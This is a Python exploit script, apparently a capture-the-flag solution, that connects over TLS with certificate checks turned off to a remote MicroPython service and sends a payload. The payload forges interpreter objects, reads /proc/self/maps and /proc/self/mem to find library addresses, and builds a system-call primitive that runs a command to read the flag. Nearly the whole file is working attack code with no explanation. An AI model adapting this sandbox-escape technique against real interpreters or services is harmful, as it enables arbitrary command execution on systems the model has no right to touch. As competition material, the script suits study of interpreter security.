#!/usr/bin/env python3
import socket
import ssl
import sys


HOST = "micromicromicropython.opus4-7.b01le.rs"
PORT = 8443

PAYLOAD = "\n".join(
    [
        "import sys",
        "base=id(dict)-0x2de30",
        "tr=range(id('FileIO'),base+0x2fb40,1);mr=range(15,1,id(tr)+8);sys.modules['t']=staticmethod(mr);g={};exec('from t import *',g);FileIO=g['FileIO']",
        "tr=range(id('TextIOWrapper'),base+0x2fb10,1);mr=range(15,1,id(tr)+8);sys.modules['t']=staticmethod(mr);g={};exec('from t import *',g);TextIOWrapper=g['TextIOWrapper']",
        "r=range(base+0x2e530,base+0x1f319,1)",
        "tr=range(id('fopen3'),id(r)+8,1);mr=range(15,1,id(tr)+8);sys.modules['t']=staticmethod(mr);g={};exec('from t import *',g);fopen3=g['fopen3']",
        "m=fopen3(TextIOWrapper,'/proc/self/maps','r').read()",
        "ld=[int(line.split('-')[0],16) for line in m.split('\\n') if '/lib/ld-musl-x86_64.so.1' in line and '00000000' in line][0]",
        "f=fopen3(FileIO,'/proc/self/mem','rb')",
        "cmd=''.join(['/cat','flag'])",
        "_=f.seek(id(cmd)+24)",
        "dp=int.from_bytes(f.read(8),'little')",
        "r=range(base+0x2e570,ld+0x5c5b6,1)",
        "tr=range(id('sys1'),id(r)+8,1);mr=range(15,1,id(tr)+8);sys.modules['t']=staticmethod(mr);g={};exec('from t import *',g);sys1=g['sys1']",
        "tr=range(id('arg'),dp,1);mr=range(15,1,id(tr)+8);sys.modules['t']=staticmethod(mr);g={};exec('from t import *',g);arg=g['arg']",
        "_=sys1(arg)",
        "",
    ]
)


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as tls:
            tls.settimeout(2)
            data = []

            while True:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                data.append(chunk)
                if b">>> " in chunk:
                    break

            tls.sendall(PAYLOAD.encode())

            while True:
                try:
                    chunk = tls.recv(4096)
                except TimeoutError:
                    break
                if not chunk:
                    break
                data.append(chunk)

    sys.stdout.buffer.write(b"".join(data))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
